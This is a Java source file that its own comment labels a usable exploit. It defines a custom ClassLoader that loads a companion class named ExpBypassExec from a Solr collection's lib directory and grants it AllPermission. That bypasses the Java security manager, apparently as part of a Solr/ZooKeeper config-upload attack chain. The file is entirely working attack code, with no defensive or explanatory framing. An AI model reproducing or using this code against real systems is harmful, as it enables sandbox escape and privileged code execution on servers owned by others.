/*
可使用的exp：需要与ExpBypassExec/ExpBypassMain合用，需要在JDK 8下编译（因为AccessController在jdk17中废弃了）
*/
package zk_backup_0.configs.conf1;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.channels.WritableByteChannel;
import java.security.*;
import java.security.cert.Certificate;
import java.util.Arrays;

public class ExpBypassLoader extends ClassLoader {
    public ExpBypassLoader() {}

    public ExpBypassLoader(ClassLoader loader) {
        super(loader);
    }

    @Override
    public Class<?> loadClass(String name) throws ClassNotFoundException {
        if (name.contains("ExpBypassExec")) {
            System.out.println("myLoadClass");
            System.out.println(name);
            return findClass(name);
        }
        return super.loadClass(name);
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        File file = getClassFile(name);
        try {
            System.out.println("findClass");
            byte[] bytes = getClassBytes(file);
            System.out.println(Arrays.toString(bytes));
            //在这里调用defineClazz，而不是super.defineClass
            Class<?> c = defineClazz(name, bytes, 0, bytes.length);
            return c;
        } catch (Exception e) {
            e.printStackTrace();
        }

        return super.findClass(name);
    }

    protected final Class<?> defineClazz(String name, byte[] b, int off, int len) throws ClassFormatError {
        try {
            System.out.println("defineClazz");
            PermissionCollection pc = new Permissions();
            pc.add(new AllPermission());

            //设置ProtectionDomain
            ProtectionDomain pd = new ProtectionDomain(new CodeSource((URL) null, (Certificate[]) null),
                    pc, this, null);

            return this.defineClass(name, b, off, len, pd);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private File getClassFile(String name) {
        String path = name.replace(".", "/");
        File file = new File("/var/solr/data/collection2_shard1_replica_n1/lib/collection1/" + path + ".class");
        return file;
    }

    private byte[] getClassBytes(File file) throws Exception {
        FileInputStream fis = new FileInputStream(file);
        FileChannel fc = fis.getChannel();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        WritableByteChannel wbc = Channels.newChannel(baos);
        ByteBuffer by = ByteBuffer.allocate(1024);

        while (true) {
            int i = fc.read(by);
            if (i == 0 || i == -1) {
                break;
            }

            by.flip();
            wbc.write(by);
            by.clear();
        }
        fis.close();
        return baos.toByteArray();
    }
}
